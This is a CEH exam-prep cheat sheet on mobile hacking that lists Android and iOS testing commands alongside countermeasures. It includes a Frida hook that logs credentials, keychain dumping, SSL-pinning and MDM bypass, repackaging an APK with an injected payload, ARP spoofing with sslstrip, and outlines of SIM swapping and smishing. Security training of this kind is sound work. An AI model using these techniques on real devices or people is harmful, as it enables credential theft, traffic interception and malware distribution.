# Mobile Hacking (CEH v13 Module 17)

> For authorized security testing, red team exercises, and educational study only.

Attack vectors, tools, and techniques for mobile platform security testing across Android and iOS.

## OWASP Mobile Top 10 (2024)

| ID  | Category                          | Key Risk                                      |
|-----|-----------------------------------|-----------------------------------------------|
| M1  | Improper Credential Usage         | Hardcoded keys, stored creds in plaintext      |
| M2  | Inadequate Supply Chain Security  | Malicious SDKs, compromised dependencies       |
| M3  | Insecure Authentication/Authorization | Weak auth flows, client-side checks only  |
| M4  | Insufficient Input/Output Validation | Injection via intents, deep links, IPC     |
| M5  | Insecure Communication            | Cleartext traffic, missing cert pinning        |
| M6  | Inadequate Privacy Controls       | PII leakage, excessive permissions             |
| M7  | Insufficient Binary Protections   | No obfuscation, debug builds in production     |
| M8  | Security Misconfiguration         | Debug flags, exported components, backup=true  |
| M9  | Insecure Data Storage             | SharedPrefs, SQLite, SD card in plaintext      |
| M10 | Insufficient Cryptography         | Weak algorithms, hardcoded keys, bad IV/salt   |

## Android Attack Vectors

### APK Analysis and Reverse Engineering

```bash
# Decompile APK with apktool
apktool d target.apk -o output_dir

# Convert DEX to JAR for Java decompilation
d2j-dex2jar target.apk -o target.jar

# Decompile with jadx (direct APK to Java source)
jadx -d output_dir target.apk
jadx-gui target.apk

# Read smali bytecode
baksmali d classes.dex -o smali_out
# Reassemble after modification
smali a smali_out -o classes.dex
```

### ADB Exploitation

```bash
# List connected devices
adb devices

# Get a shell
adb shell

# Pull app data (requires root or debuggable app)
adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/creds.xml
adb pull /data/data/com.target.app/databases/app.db

# Install modified APK
adb install -r modified.apk

# Log monitoring
adb logcat | grep -i "password\|token\|secret\|key"

# Port forwarding for proxy
adb reverse tcp:8080 tcp:8080

# Dump backup (if android:allowBackup="true")
adb backup -f backup.ab -noapk com.target.app
# Extract backup
java -jar abe.jar unpack backup.ab backup.tar
```

### Intent Sniffing and Spoofing

```bash
# List exported activities
adb shell dumpsys package com.target.app | grep -A5 "Activity"

# Launch exported activity
adb shell am start -n com.target.app/.ExportedActivity

# Send broadcast intent
adb shell am broadcast -a com.target.app.ACTION_NAME \
  --es "extra_key" "extra_value"

# Sniff intents with drozer
dz> run app.broadcast.sniff --action com.target.app.ACTION
```

### Content Provider Leaks

```bash
# Enumerate content providers with drozer
dz> run app.provider.info -a com.target.app
dz> run app.provider.finduri com.target.app

# Query exposed provider
dz> run app.provider.query content://com.target.app.provider/users
dz> run scanner.provider.injection -a com.target.app
dz> run scanner.provider.traversal -a com.target.app
```

### WebView Vulnerabilities

```
# Indicators in decompiled source:
setJavaScriptEnabled(true)           # JS execution in WebView
addJavascriptInterface(obj, "name")  # JS bridge -> RCE potential
setAllowFileAccess(true)             # file:// scheme access
setAllowUniversalAccessFromFileURLs(true)  # cross-origin file read
```

### Insecure Storage Locations

```bash
# SharedPreferences (XML plaintext)
/data/data/com.target.app/shared_prefs/*.xml

# SQLite databases
/data/data/com.target.app/databases/*.db
sqlite3 /data/data/com.target.app/databases/app.db ".dump"

# External storage (world-readable)
/sdcard/Android/data/com.target.app/

# Examine with root shell
find /data/data/com.target.app -name "*.xml" -o -name "*.db" -o -name "*.json"
```

## iOS Attack Vectors

### Jailbreaking and IPA Analysis

```bash
# Decrypt IPA from jailbroken device (using frida-ios-dump)
python3 dump.py com.target.app

# Extract IPA contents
unzip target.ipa -d ipa_contents

# Analyze binary
otool -L Payload/App.app/App          # list linked libraries
strings Payload/App.app/App | grep -i "http\|api\|key\|secret"
class-dump Payload/App.app/App > headers.h
```

### Frida Hooking

```bash
# List running processes
frida-ps -Ua

# Attach to running app
frida -U com.target.app

# Load script
frida -U -l hook.js com.target.app

# Spawn and hook
frida -U -f com.target.app -l hook.js --no-pause
```

```javascript
// hook.js - Bypass root/jailbreak detection
Interceptor.attach(Module.findExportByName(null, "isJailbroken"), {
  onLeave: function(retval) {
    retval.replace(0x0);
    console.log("[*] Jailbreak detection bypassed");
  }
});

// Hook Objective-C method
var cls = ObjC.classes.LoginViewController;
Interceptor.attach(cls["- validateCredentials:"].implementation, {
  onEnter: function(args) {
    console.log("[*] Creds: " + ObjC.Object(args[2]).toString());
  }
});
```

### Objection (Runtime Exploration)

```bash
# Connect to app
objection -g com.target.app explore

# Common commands
ios hooking list classes
ios hooking watch method "-[LoginVC checkPassword:]" --dump-args
ios keychain dump
ios plist cat /var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/*.plist
ios nsuserdefaults get
ios sslpinning disable
android sslpinning disable
android root disable
```

### SSL Pinning Bypass

```bash
# Frida script for SSL pinning bypass (Android)
frida -U -f com.target.app -l ssl-pinning-bypass.js --no-pause

# Objection one-liner
objection -g com.target.app explore -s "android sslpinning disable"
objection -g com.target.app explore -s "ios sslpinning disable"

# Using Magisk + TrustMeAlready module (Android, system-wide)
# Install module via Magisk Manager -> reboot
```

### Keychain and Plist Inspection (iOS)

```bash
# Dump keychain with objection
objection -g com.target.app explore -c "ios keychain dump"

# Dump keychain with keychain-dumper (jailbroken device)
./keychain-dumper

# Inspect plist files
plutil -p /var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/com.target.app.plist

# Search for sensitive data in NSUserDefaults
find /var/mobile/Containers/Data -name "*.plist" -exec plutil -p {} \; 2>/dev/null | grep -i "token\|password\|key"
```

## Mobile Device Management (MDM) Bypass

```bash
# Check enrolled MDM profiles (iOS)
# Settings -> General -> VPN & Device Management

# Remove MDM profile (jailbroken device)
rm /var/containers/Shared/SystemGroup/*/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles/PublicInfo/EffectiveUserSettings.plist

# Android — remove device admin/MDM
adb shell dpm remove-active-admin com.mdm.vendor/.AdminReceiver

# Enrollment spoofing: intercept enrollment URL and replay
# with modified device identity (serial, UDID, IMEI)
# via proxy — modify enrollment API requests in Burp Suite
```

## App Store Attacks

```bash
# Decompile -> inject payload -> repackage (Android)
apktool d legit.apk -o legit_src
# Insert malicious smali code or native library
apktool b legit_src -o repackaged.apk

# Sign repackaged APK
keytool -genkey -v -keystore test.keystore -alias test -keyalg RSA -keysize 2048
jarsigner -keystore test.keystore repackaged.apk test
# Or with apksigner
apksigner sign --ks test.keystore repackaged.apk

# Zipalign
zipalign -v 4 repackaged.apk final.apk

# Sideload
adb install final.apk

# iOS sideloading via AltStore, Cydia Impactor, or enterprise certificates
```

## Network-Level Attacks on Mobile

```bash
# Burp Suite mobile proxy setup
# 1. Set device Wi-Fi proxy to <attacker-ip>:8080
# 2. Install Burp CA cert on device:
#    Android: Settings -> Security -> Install from storage
#    iOS: visit http://<attacker-ip>:8080/cert in Safari -> trust profile

# SSL stripping with bettercap
sudo bettercap -iface wlan0
> net.probe on
> set arp.spoof.targets <device-ip>
> arp.spoof on
> set http.proxy.sslstrip true
> http.proxy on

# mitmproxy for programmatic interception
mitmproxy --mode regular --listen-port 8080
# With scripting
mitmdump -s modify_response.py --listen-port 8080
```

## SMS / SS7 Attacks

```
SIM Swapping:
  - Social engineering carrier support to port victim's number
  - Attacker receives SMS 2FA codes on cloned SIM
  - Used to bypass SMS-based MFA for banking, email, crypto

SS7 Interception:
  - SendRoutingInfoForSM: locate subscriber, intercept SMS
  - Requires SS7 network access (telecom insider or purchased)
  - Tools: SigPloit, ss7MAPer (for authorized testing only)

Smishing (SMS Phishing):
  - Craft SMS with malicious link mimicking bank/service
  - Abuse URL shorteners to mask destination
  - Carrier-grade SMS gateways for sender ID spoofing
```

## Static Analysis

```bash
# MobSF (Mobile Security Framework) — automated analysis
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf
# Upload APK/IPA via web interface at http://localhost:8000

# QARK (Quick Android Review Kit)
qark --apk target.apk
qark --java /path/to/decompiled/source

# AndroBugs
python androbugs.py -f target.apk

# grep for common issues in decompiled source
grep -rn "MODE_WORLD_READABLE\|MODE_WORLD_WRITEABLE" .
grep -rn "addJavascriptInterface\|setJavaScriptEnabled" .
grep -rn "getSharedPreferences\|openFileOutput" .
grep -rn "SELECT.*FROM\|rawQuery\|execSQL" .   # SQLi candidates
grep -rn "http://" .                            # cleartext traffic
```

## Dynamic Analysis

```bash
# drozer — Android IPC attack surface
dz> run app.package.attacksurface com.target.app
dz> run app.activity.info -a com.target.app
dz> run app.service.info -a com.target.app
dz> run scanner.misc.native -a com.target.app

# Frida — runtime instrumentation (see iOS section above)
# Trace all JNI calls
frida-trace -U -i "Java_*" com.target.app

# Burp Suite mobile testing
# Configure invisible proxy for apps that ignore system proxy
# Use Match and Replace rules to modify requests/responses

# Network traffic capture (alternative to proxy)
tcpdump -i any -w capture.pcap          # on rooted device
```

## Reverse Engineering

```bash
# smali/baksmali — Dalvik bytecode
baksmali d classes.dex -o smali_output
# Edit .smali files, then reassemble
smali a smali_output -o classes.dex

# Ghidra — ARM binary analysis (free)
ghidraRun
# Import native .so libraries or iOS Mach-O binaries
# Auto-analyze -> examine decompiled C pseudocode

# IDA Pro — disassembly and decompilation
# Load ARM ELF (.so) or Mach-O binaries
# Use Hex-Rays decompiler for C pseudocode output

# r2/radare2 — CLI reverse engineering
r2 -A libnative.so
> afl                    # list functions
> pdf @sym.Java_com_target_app_NativeLib_decrypt
```

## Countermeasures

```
Code Obfuscation:
  - Android: Enable ProGuard/R8 in build.gradle
    minifyEnabled true
    proguardFiles getDefaultProguardFile('proguard-android-optimize.txt')
  - iOS: Use SwiftShield, LLVM obfuscator

Root/Jailbreak Detection:
  - Check for su binary, Magisk, Cydia, Substrate
  - Verify system partition integrity
  - Use SafetyNet/Play Integrity API (Android)
  - Use DeviceCheck / App Attest (iOS)

Certificate Pinning:
  - Android: Network Security Config with pin-set
  - iOS: TrustKit or URLSession delegate pinning
  - Pin to leaf cert or public key hash (SPKI)

Secure Storage:
  - Android: AndroidKeyStore for keys, EncryptedSharedPreferences
  - iOS: Keychain Services with kSecAttrAccessibleWhenUnlockedThisDeviceOnly
  - Never store secrets in SharedPreferences, plist, or SQLite plaintext

Binary Protections:
  - Strip debug symbols in release builds
  - Detect debugger attachment (ptrace, sysctl)
  - Integrity checks on APK/IPA signature at runtime
```

## Tips

- Always start with static analysis (MobSF) before dynamic testing -- it reveals the attack surface fast.
- Use `android:networkSecurityConfig` in AndroidManifest.xml to check if cleartext is allowed.
- Look for `android:debuggable="true"` and `android:allowBackup="true"` in the manifest.
- On Android 7+, user-installed CAs are not trusted by default; use Magisk + custom module or Frida to inject certs.
- For iOS, check `Info.plist` for `NSAppTransportSecurity` exceptions (NSAllowsArbitraryLoads).
- drozer is the go-to for Android IPC testing (intents, providers, services, receivers).
- Frida + Objection covers 80% of runtime testing on both platforms.
- SS7 attacks are real but require telecom-level access; CEH focuses on awareness, not hands-on.
- For exam: know OWASP Mobile Top 10 categories and which tools map to which attack vector.

## See Also

- `sheets/offensive/web-app-hacking.md` — Overlapping web vulnerabilities in mobile backends
- `sheets/offensive/social-engineering.md` — Smishing and mobile phishing techniques
- `sheets/offensive/wireless-hacking.md` — Wi-Fi attacks affecting mobile devices
- `detail/offensive/mobile-hacking.md` — Deep-dive on Android/iOS security models, Frida internals

## References

- OWASP Mobile Top 10 (2024): https://owasp.org/www-project-mobile-top-10/
- OWASP MASTG (Mobile App Security Testing Guide): https://mas.owasp.org/MASTG/
- Frida documentation: https://frida.re/docs/
- Objection wiki: https://github.com/sensepost/objection/wiki
- MobSF documentation: https://mobsf.github.io/docs/
- drozer guide: https://labs.withsecure.com/tools/drozer
- CEH v13 Module 17: Hacking Mobile Platforms
